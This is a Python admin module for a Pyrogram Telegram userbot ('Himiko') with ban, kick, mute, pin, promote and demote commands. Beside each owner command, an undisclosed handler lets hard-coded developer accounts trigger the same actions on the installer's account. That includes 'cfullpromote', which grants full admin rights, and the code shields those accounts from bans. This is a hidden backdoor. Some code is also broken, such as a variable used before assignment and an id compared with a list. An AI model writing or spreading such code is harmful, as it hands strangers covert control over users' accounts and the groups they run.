import asyncio

from pyrogram import Client, filters, enums
from pyrogram.errors import ChatAdminRequired
from pyrogram.types import ChatPermissions, ChatPrivileges, Message

from config import CMD_HANDLER as cmd
from Himiko.helpers.adminHelpers import DEVS
from Himiko.helpers.basic import edit_or_reply
from Himiko.helpers.PyroHelpers import ReplyCheck
from .help import add_command_help
from Himiko.utils.misc import extract_user, extract_user_and_reason, list_admins

unmute_permissions = ChatPermissions(
    can_send_messages=True,
    can_send_media_messages=True,
    can_send_polls=True,
    can_change_info=False,
    can_invite_users=True,
    can_pin_messages=False,
)


@Client.on_message(
    filters.group & filters.command("cban", ["(", "-", "^", "!"]) & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.group & filters.command(["ban"], cmd) & filters.me)
async def member_ban(client: Client, message: Message):
    user_id, reason = await extract_user_and_reason(message, sender_chat=True)
    rd = await message.reply("`Processing...`")
    if not user_id:
        return await rd.edit("I can't find that user.")
    if user_id == client.me.id:
        return await rd.edit("I can't banned myself.")
    if user_id in DEVS:
        return await rd.edit("I can't banned my developer.")
    if user_id in (await list_admins(client, message.chat.id)):
        return await rd.edit("I can't perform this action because I'm not an administrator.")
    try:
        mention = (await client.get_users(user_id)).mention
    except IndexError:
        mention = (
            message.reply_to_message.sender_chat.title
            if message.reply_to_message
            else "Anon"
        )
    if message.command[0][0] == "d":
        await message.reply_to_message.delete()
    msg = f"Banned User: {mention}\nBanned By: {message.from_user.mention}\n"
    if reason:
        msg += f"Reason: {reason}"
    try:
        await message.chat.ban_member(user_id)
        await rd.edit(msg)
    except ChatAdminRequired:
        return await rd.edit("**I can't perform this action because I'm not an administrator.**")


@Client.on_message(filters.command("cunban", ["(", "-", "^", "!"]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.group & filters.command(["unban"], cmd) & filters.me)
async def member_unban(client: Client, message: Message):
    reply = message.reply_to_message
    rd = await message.reply("`Processing...`")
    if reply and reply.sender_chat and reply.sender_chat != message.chat.id:
        return await rd.edit("I can't unban channels.")

    if len(message.command) == 2:
        user = message.text.split(None, 1)[1]
    elif len(message.command) == 1 and reply:
        user = message.reply_to_message.from_user.id
    else:
        return await rd.edit(
            "Provide a username or reply to a user's message to unban."
        )
    try:
        await message.chat.unban_member(user)
        umention = (await client.get_users(user)).mention
        await rd.edit(f"Unbanned! {umention}")
    except ChatAdminRequired:
        return await rd.edit("**I can't perform this action because I'm not an administrator.**")
    


@Client.on_message(
    filters.command(["cpin", "cunpin"], "-") & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.command(["pin", "unpin"], cmd) & filters.me)
async def pin_message(client: Client, message):
    if not message.reply_to_message:
        return await message.edit_text("Reply to a message to pin/unpin it.")
    rd = await message.reply("`Processing...`")
    r = message.reply_to_message
    if message.command[0][0] == "u":
        await r.unpin()
        return await rd.edit(
            f"**Unpinned [this]({r.link}) message.**",
            disable_web_page_preview=True,
        )
    try:
        await r.pin(disable_notification=True)
        await rd.edit(
            f"**Pinned [this]({r.link}) message.**",
            disable_web_page_preview=True,
        )
    except ChatAdminRequired:
        return await rd.edit("**I can't perform this action because I'm not an administrator.**")
    

@Client.on_message(filters.command(["cmute"], ["(", "-", "^", "!"]) & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command(["mute"], cmd) & filters.me)
async def mute(client: Client, message: Message):
    user_id, reason = await extract_user_and_reason(message)
    rd = await message.reply("`Processing...`")
    if not user_id:
        return await rd.edit("I can't find that user.")
    if user_id == client.me.id:
        return await rd.edit("I can't muted myself.")
    if user_id in DEVS:
        return await rd.edit("I can't muted my developer.")
    if user_id in (await list_admins(client, message.chat.id)):
        return await rd.edit("I can't perform this action because I'm not an administrator.")
    mention = (await client.get_users(user_id)).mention
    msg = (
        f" **Muted User**: {mention}\n"
        f" **Muted By**: {message.from_user.mention if message.from_user else 'Anon'}\n"
    )
    if reason:
        msg += f" **Reason**: {reason}"
    try:
        await message.chat.restrict_member(user_id, permissions=ChatPermissions())
        await rd.edit(msg)
    except ChatAdminRequired:
        return await rd.edit("**I can't perform this action because I'm not an administrator.**")

cmdz = [".", "*", "!", "?", "u"]

@Client.on_message(
    filters.command(["cunmute"], ["(", "-", "^", "!"]) & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.group & filters.command(["unmute", "mute"], cmd) & filters.me)
async def unmute(client: Client, message: Message):
    user_id = await extract_user(message)
    rd = await message.reply("`Processing...`")
    if not user_id:
        return await rd.edit("I can't find that user.")
    try:
        await message.chat.restrict_member(user_id, permissions=unmute_permissions)
        umention = (await client.get_users(user_id)).mention
        await rd.edit(f"Unmuted! {umention}")
    except ChatAdminRequired:
        return await rd.edit("**I can't perform this action because I'm not an administrator.**")
    
cmda = [".", "*", "!", "?", "k"]

@Client.on_message(
    filters.command(["ckick"], "-") & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.command(["kick", "ick"], cmd) & filters.me)
async def kick_user(client: Client, message: Message):
    user_id, reason = await extract_user_and_reason(message)
    rd = await message.reply("`Processing...`")
    if not user_id:
        return await rd.edit("I can't find that user.")
    if user_id == client.me.id:
        return await rd.edit("I can't kick myself.")
    if user_id == DEVS:
        return await rd.edit("I can't kick my developer.")
    if user_id in (await list_admins(client, message.chat.id)):
        return await rd.edit("I can't perform this action because I'm not an administrator.")
    mention = (await client.get_users(user_id)).mention
    msg = f"""
**Kicked User:** {mention}
**Kicked By:** {message.from_user.mention if message.from_user else 'Anon'}"""
    if message.command[0][0] == "d":
        await message.reply_to_message.delete()
    if reason:
        msg += f"\n**Reason:** `{reason}`"
    try:
        await message.chat.ban_member(user_id)
        await rd.edit(msg)
        await asyncio.sleep(1)
        await message.chat.unban_member(user_id)
    except ChatAdminRequired:
        return await rd.edit("**I can't perform this action because I'm not an administrator.**")


@Client.on_message(
    filters.group
    & filters.command(["cpromote", "cfullpromote"], ["(", "-", "^", "!"])
    & filters.user(DEVS)
    & ~filters.me
)
@Client.on_message(
    filters.group & filters.command(["promote", "fullpromote"], cmd) & filters.me
)
async def promotte(client: Client, message: Message):
    user_id = await extract_user(message)
    sin = await message.reply("`Processing...`")
    if not user_id:
        return await sin.edit("I can't find that user.")
    if user_id == client.me.id:
        return await rd.edit("I can't promote myself..")
    rd = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    try: 
        if message.command[0][0] == "f":
            await message.chat.promote_member(
                user_id,
                privileges=ChatPrivileges(
                    can_manage_chat=True,
                    can_delete_messages=True,
                    can_manage_video_chats=True,
                    can_restrict_members=True,
                    can_change_info=True,
                    can_invite_users=True,
                    can_pin_messages=True,
                    can_promote_members=True,
                ),
            )
            umention = (await client.get_users(user_id)).mention
            return await sin.edit(f"FulllyPromoted! {umention}")

        await message.chat.promote_member(
            user_id,
            privileges=ChatPrivileges(
                can_manage_chat=True,
                can_delete_messages=True,
                can_manage_video_chats=True,
                can_restrict_members=True,
                can_change_info=False,
                can_invite_users=True,
                can_pin_messages=True,
                can_promote_members=False,
            ),
        )
        umention = (await client.get_users(user_id)).mention
        await sin.edit(f"Promoted! {umention}")
    except ChatAdminRequired:
        return await sin.edit("**I can't perform this action because I'm not an administrator.**")


@Client.on_message(
    filters.group
    & filters.command(["cdemote"], ["(", "-", "^", "!"])
    & filters.user(DEVS)
    & ~filters.me
)
@Client.on_message(filters.group & filters.command(["demote"], cmd) & filters.me)
async def demote(client: Client, message: Message):
    user_id = await extract_user(message)
    rd = await message.reply("`Processing...`")
    if not user_id:
        return await rd.edit("I can't find that user.")
    if user_id == client.me.id:
        return await rd.edit("I can't demote myself.")
    await message.chat.promote_member(
        user_id,
        privileges=ChatPrivileges(
            can_manage_chat=False,
            can_delete_messages=False,
            can_manage_video_chats=False,
            can_restrict_members=False,
            can_change_info=False,
            can_invite_users=False,
            can_pin_messages=False,
            can_promote_members=False,
        ),
    )
    umention = (await client.get_users(user_id)).mention
    await rd.edit(f"Demoted! {umention}")


add_command_help(
    "admin",
    [
        [f"ban [reply/username/userid] [alasan]", "Ban A User To Group."],
        [
            f"unban [reply/username/userid] [alasan]",
            "Unban A User To Group.",
        ],
        [f"kick [reply/username/userid]", "Kick A User To Group."],
        [
            f"promote",
            "Promote A Member."],
        [
            f"fullpromote",
            "Promote A Member With All Rights.",
        ],
        [f"demote", "Demote A Member."],
        [
            f"mute [reply/username/userid]",
            "Muted A User To Group.",
        ],
        [
            f"unmute [reply/username/userid]",
            "Unmuted A User To Group.",
        ],
        [
            f"pin [reply]",
            "Pin A Message To Group.",
        ],
        [
            f"unpin [reply]",
            "Unpin A Message To Group.",
        ],
    ],
)
